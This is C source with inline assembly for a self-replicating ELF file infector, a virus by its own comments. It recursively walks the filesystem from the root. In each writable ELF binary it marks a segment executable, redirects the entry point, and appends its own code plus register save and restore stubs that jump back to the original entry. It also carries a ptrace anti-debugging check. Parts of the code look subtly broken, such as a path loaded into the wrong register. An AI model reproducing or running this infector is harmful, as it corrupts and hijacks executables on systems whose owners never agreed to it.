#define _GNU_SOURCE
#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <sys/stat.h>
#include <sys/syscall.h>

#define SPARE_FDS  (4) 
#define MAX_FDS    (512)

struct linux_dirent {
   long           d_ino;
   off_t          d_off;
   unsigned short d_reclen;
   char           d_name[];
};
static inline int my_access(const char *fpath, int flag);
static inline int my_open(const char *fpath, int flag);
static inline int my_read(unsigned int fd, char *buf, int count);
static inline int my_write(unsigned int fd, char *buf, int count);
static inline int my_lseek(int fd, int offset, int origin);
static inline int my_getdent(int fd, struct linux_dirent *dirent, int count);
void my_memcpy(char* d, char* s, int l);
int my_strlen(const char *str);
int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data);
int my_strcmp(char *str1, char *str2);
void  *my_memset(void *b, int c, int len);
void listdir(const char *dirname,long long int startrip);
void change_entrypoint(const char* ,long long int startrip);
static inline long long int hereis();

// Save register context
int main(int argc, char* argv[])
{
	int startrip;
	char infected[10] = {'I','N','F','E','C','T','E','D','\n',0};
	my_write(1,infected,9);
	
	// get current RIP
	asm("lea (%rip), %rax");
	asm("lea (%%rax), %0":"=r"(startrip)); //  <main+84>
	startrip = startrip - 84;
	
	// debug
	// printf("main RIP is : 0x%x\n",startrip);
	if((my_ptraceme(0,0,0,0)!=0)) while(1);
	
	char dot[2]={'/',0}; // TODO : 고치기!!!
    listdir(dot,startrip);
	
	// Here is dummy instruction. It would be patched when copied to binary. 
	startrip = startrip + 1;
	startrip = startrip - 1;
	startrip = startrip + 1;
	startrip = startrip - 1;
	startrip = startrip + 1;
	startrip = startrip - 1;
	
}


static inline int my_access(const char *fpath, int flag){
	/*
     #define R_OK   4   // test for read permission 
     #define W_OK   2   // test for write permission 
     #define X_OK   1   // test for execute (search) permission 
     #define F_OK   0   // test for presence of file 
	*/
   long long ret;
   asm("mov %0, %%rdi"::"r" ((long long)fpath));
   asm("mov %0, %%rsi"::"r" ((long long)flag));
   asm("mov $21, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_open(const char *fpath, int flag){
    long long ret;
    asm("mov %0, %%rsi"::"r"((long long)fpath));
    asm("mov %0, %%rsi"::"r"((long long)flag));
    asm("mov $2,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline int my_read(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $0,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_write(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $1,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_lseek(int fd, int offset, int origin){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long long)fd));
   asm("mov %0, %%rsi"::"r"((long long)offset));
   asm("mov %0, %%rdx"::"r"((long long)origin));
   asm("mov $8, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_getdent(int fd, struct linux_dirent *dirent, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)dirent));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $78,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}
 
void my_memcpy(char* d, char* s, int l){
    int i=0;
    while(l--){
        d[i]=s[i];
        i++;
    }
}

int my_strlen(const char *str){
   int i=0;
   while(1) if(str[i++]=='\x0') break;
   return i-1;
}

int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long)request));
   asm("mov %0, %%rsi"::"r"((long)pid));
   asm("mov %0, %%rdx"::"r"((long)addr));
   asm("mov %0, %%r10"::"r"((long)data));
   asm("mov $101, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret; // under debugging : -? / normal : 0
}

int my_strcmp(char *str1, char *str2) {
  for (;*str1 && *str1 == *str2; str2++) str1++;
  return *str1 - *str2;
}

void  *my_memset(void *b, int c, int len){
  int i;
  unsigned char *p = b;
  i = 0;
  while(len > 0){
      *p = c;
      p++;
      len--;
   }
  return(b);
}

void listdir(const char *dirname,long long int startrip){
    int nread = 0;
    int dirname_len = my_strlen(dirname);
    int d_name_len;
    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
    struct linux_dirent *d;
    int bpos = 0;
    char d_type;
    char buf[1000];
    char subdir[4096+1]; // PATH_MAX
    char subfile[4096+1]; // PATH_MAX
    char dot[2] = {'.', 0};
    char dotdot[3] = {'.', '.', 0};
    char slash[2] = {'/', 0};
    for ( ; ; ) {
		nread = my_getdent(fd,(struct linux_dirent *)buf, 1000);
		if (nread <= 0) break;
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent*) (buf + bpos);
			d_type = *(buf + bpos + d->d_reclen - 1);
			d_name_len = my_strlen(d->d_name);
			bpos += d->d_reclen;
			my_memcpy(subfile,dirname,dirname_len);
			my_memcpy(subfile + dirname_len, slash, 1);
			my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
			// here
			change_entrypoint(subfile,startrip);
			
			
			if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
			{
				if(d_type == DT_DIR) // if directory
				{
					my_memcpy(subdir, dirname, dirname_len);
					my_memcpy(subdir + dirname_len, slash, 1);
					my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
					listdir(subdir,startrip);
				}
			}
		}
    }
}

void change_entrypoint(const char* fpath,long long int startrip){
	char shellcode[0x1000];
	int fd, i, shellcodeloc;
	int is_infected_already = 1;  
	int filesize;
	long long int oep;
	long long int oep_relocated;
	long long int endrip;
	Elf64_Shdr shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	
	if(my_access(fpath,7)!=0) return 0; // R_OK|W_OK|X_OK = 7
	fd = my_open(fpath, 2); // O_RDWR = 2
	if (fd < 0) return 0;
	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0;
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F'))return 0;
	
	my_lseek(fd, ehdr.e_phoff, SEEK_SET); 
	// Read phdr(page header)
	for(i=0;i<ehdr.e_phnum;i++){
		if (my_read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)) return 0;
		else{ // Find RW_ Data page(Loadable Segment && PF_Read_Write(6)). change permission [RW_] --> [RWX]
			if(phdr.p_type==1 && phdr.p_flags==5){
				my_lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
				phdr.p_flags=7; 
				phdr.p_filesz += 0x10000; // Enlarge page size
				phdr.p_memsz += 0x10000;  // Enlarge page size
				
				my_write(fd, &phdr, sizeof(phdr));
				is_infected_already = 0;  // This binary isn't infected already.
				break;                    // 대상 phdr를 읽은상태에서 break.
			}
		}
	}
	if(is_infected_already) return 0;
	

	
	
	/*---------------------------------------------------------------------------*/
	// ELF header manipulation
	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
	shellcodeloc = phdr.p_vaddr + filesize; 
	oep = ehdr.e_entry;
	ehdr.e_entry = shellcodeloc; // Manipulate OEP (original entry point)
	my_lseek(fd, 0, SEEK_SET);
	my_write(fd, &ehdr, sizeof(ehdr));
	
	
	
	

	

	
	/* --------------------------------------------------------------------------*/
	// Add malicious routine at the end of file. 
	// Malicious routine consists below.
	// ■ [01] Save register context
	// □ [02] Total malicious code
	// □ [03] Restore register context and jump to OEP 
	/* --------------------------------------------------------------------------*/
	my_lseek(fd, 0, SEEK_END);
	my_memset(shellcode,'\x90',0x1000);
	
	// Backup $rax~$rdp to stack. 
	// Backup curret stack pointer $rsp to $r15(전체 virus루틴에서 사용하지 않는 레지스터)
	/*
	   50	push   %rax
       53	push   %rbx
       51	push   %rcx
       52	push   %rdx
       57	push   %rdi
       55	push   %rbp
       49 89 e7	mov    %rsp,%r15
	*/
	shellcode[0] = '\x50';
	shellcode[1] = '\x53';
	shellcode[2] = '\x51';
	shellcode[3] = '\x52';
	shellcode[4] = '\x57';
	shellcode[5] = '\x55';
	shellcode[6] = '\x49';
	shellcode[7] = '\x89';
	shellcode[8] = '\xe7';
	my_write(fd,shellcode,10);
	
	
	
	
	
	
		
		
	
	/* --------------------------------------------------------------------------*/
	// Add malicious routine at the end of file. 
	// Malicious routine consists below.
	// □ [01] Save register context
	// ■ [02] Total malicious code
	// □ [03] Restore register context and jump to OEP 
	/* --------------------------------------------------------------------------*/
	my_lseek(fd, 0, SEEK_END);
	endrip = hereis() + 10;
	my_write(fd, startrip, endrip - startrip); 

	
	
	
	
	
	
	
	
	
	/* --------------------------------------------------------------------------*/
	// Add malicious routine at the end of file. 
	// Malicious routine consists below.
	// □ [01] Save register context
	// □ [02] Total malicious code
	// ■ [03] Restore register context and jump to OEP 
	/* --------------------------------------------------------------------------*/
	my_memset(shellcode,'\x90',0x1000);
	// Restore register contex (before jump to OEP)
	/*   
       4c 89 fc	mov    %r15,%rsp
       5d	pop    %rbp
       5f	pop    %rdi
       5a	pop    %rdx
       59	pop    %rcx
       5b	pop    %rbx
       58	pop    %rax
	*/
	shellcode[0] = '\x4c';
	shellcode[1] = '\x89';
	shellcode[2] = '\xfc';
	shellcode[3] = '\x5d';
	shellcode[4] = '\x5f';
	shellcode[5] = '\x5a';
	shellcode[6] = '\x59';
	shellcode[7] = '\x5b';
	shellcode[8] = '\x58';
	
	
	/*
	 We use $RDI register to get relocation information. (RULES OF THUMB : $RDI holds base VA offset info in almost linux version.)
	  Ex)  - If PIE binary : 
	        *RDI  0x7ffff7ffe168 <- 0x555555554000 
	        
	        - If not :  
	        *RDI  0x7ffff7ffe168 <— 0x0
	*/
	// Jump to EOP
	/*  
	     48 b8 ?? ?? ?? ?? ?? ?? ?? ??	movabs $0x????????????????,%rax  
		 48 03 07	add    rax,QWORD PTR [rdi]  // rax 에 rdi 가 기리키는값 더하기
	     ff e0	jmpq   *%rax   
	*/
	shellcode[9] =  '\x48';
	shellcode[10] = '\xb8';
	my_memcpy(&shellcode[11], &oep, sizeof(ehdr.e_entry));	
	shellcode[19] = '\x48';
	shellcode[20] = '\x03';
	shellcode[21] = '\x07';
	shellcode[22] = '\xff';
	shellcode[23] = '\xe0';
	
	
	// Find the dummy code location and patch it to jump to OEP!
	/*
	Here is start of malicious routine.
	
	[01] Save register context
	50	push   %rax
    53	push   %rbx
    51	push   %rcx
    52	push   %rdx
    57	push   %rdi
    55	push   %rbp
    49 89 e7	mov    %rsp,%r15
	90
	
	main 은 이렇게 생겼음  // TODO : realocation위험.main에코드추가할때마다손봐주자.
   <main+0>:	55	push   %rbp
   <main+1>:	48 89 e5	mov    %rsp,%rbp
   <main+4>:	48 83 ec 30	sub    $0x30,%rsp
   <main+8>:	89 7d dc	mov    %edi,-0x24(%rbp)
   <main+11>:	48 89 75 d0	mov    %rsi,-0x30(%rbp)
   <main+15>:	c6 45 f0 49	movb   $0x49,-0x10(%rbp)
   <main+19>:	c6 45 f1 4e	movb   $0x4e,-0xf(%rbp)
   <main+23>:	c6 45 f2 46	movb   $0x46,-0xe(%rbp)
   <main+27>:	c6 45 f3 45	movb   $0x45,-0xd(%rbp)
   <main+31>:	c6 45 f4 43	movb   $0x43,-0xc(%rbp)
   <main+35>:	c6 45 f5 54	movb   $0x54,-0xb(%rbp)
   <main+39>:	c6 45 f6 45	movb   $0x45,-0xa(%rbp)
   <main+43>:	c6 45 f7 44	movb   $0x44,-0x9(%rbp)
   <main+47>:	c6 45 f8 0a	movb   $0xa,-0x8(%rbp)
   <main+51>:	c6 45 f9 00	movb   $0x0,-0x7(%rbp)
   <main+55>:	48 8d 45 f0	lea    -0x10(%rbp),%rax
   <main+59>:	ba 09 00 00 00	mov    $0x9,%edx
   <main+64>:	48 89 c6	mov    %rax,%rsi
   <main+67>:	bf 01 00 00 00	mov    $0x1,%edi
   <main+72>:	e8 04 01 00 00	callq  0x400627 <my_write>
   <main+77>:	48 8d 05 00 00 00 00	lea    0x0(%rip),%rax        # 0x40052a <main+84>
   <main+84>:	8d 00	lea    (%rax),%eax
   <main+86>:	89 45 fc	mov    %eax,-0x4(%rbp)
   <main+89>:	83 6d fc 54	subl   $0x54,-0x4(%rbp)
   <main+93>:	b9 00 00 00 00	mov    $0x0,%ecx
   <main+98>:	ba 00 00 00 00	mov    $0x0,%edx
   <main+103>:	be 00 00 00 00	mov    $0x0,%esi
   <main+108>:	bf 00 00 00 00	mov    $0x0,%edi
   <main+113>:	e8 09 02 00 00	callq  0x400755 <my_ptraceme>
   <main+118>:	85 c0	test   %eax,%eax
   <main+120>:	74 02	je     0x400552 <main+124>
   <main+122>:	eb fe	jmp    0x400550 <main+122>
   <main+124>:	c6 45 e0 2e	movb   $0x2e,-0x20(%rbp)
   <main+128>:	c6 45 e1 00	movb   $0x0,-0x1f(%rbp)
   <main+132>:	8b 45 fc	mov    -0x4(%rbp),%eax
   <main+135>:	48 63 d0	movslq %eax,%rdx
   <main+138>:	48 8d 45 e0	lea    -0x20(%rbp),%rax
   <main+142>:	48 89 d6	mov    %rdx,%rsi
   <main+145>:	48 89 c7	mov    %rax,%rdi
   <main+148>:	e8 ba 02 00 00	callq  0x400829 <listdir>
   <main+153>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)          // <- Patch from this point! 
   <main+157>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)          //    Patch location : start of file + 153 
   <main+161>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
   <main+165>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
   <main+169>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
   <main+173>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
   <main+177>:	b8 00 00 00 00	mov    $0x0,%eax
	*/
	my_lseek(fd, filesize + 10 + 153, SEEK_SET); // 10(main 전 컨텍스트 저장 루틴의 길이) + 153(Patch site) 
	my_write(fd, shellcode, 24);
}
static inline long long int hereis(){ 
	 /*
       Dump of assembler code for function hereis:
       0x000000000040054d <+0>:	55	push   %rbp
       0x000000000040054e <+1>:	48 89 e5	mov    %rsp,%rbp
       0x0000000000400551 <+4>:	48 8d 05 00 00 00 00	lea    0x0(%rip),%rax        # 0x400558 <hereis+11>
       0x0000000000400558 <+11>:	48 89 45 f8	mov    %rax,-0x8(%rbp)
       0x000000000040055c <+15>:	48 8b 45 f8	mov    -0x8(%rbp),%rax
       0x0000000000400560 <+19>:	5d	pop    %rbp
       0x0000000000400561 <+20>:	c3	retq   
	 */
	 long long int ret; // As following avobe assembly, [ret] holds value of <hereis+11>. 
	                    // Hence, end of virus routine is ret-11+21. Use it!
	 asm("lea (%%rip), %0":"=r"(ret));  
	 return ret;
 }
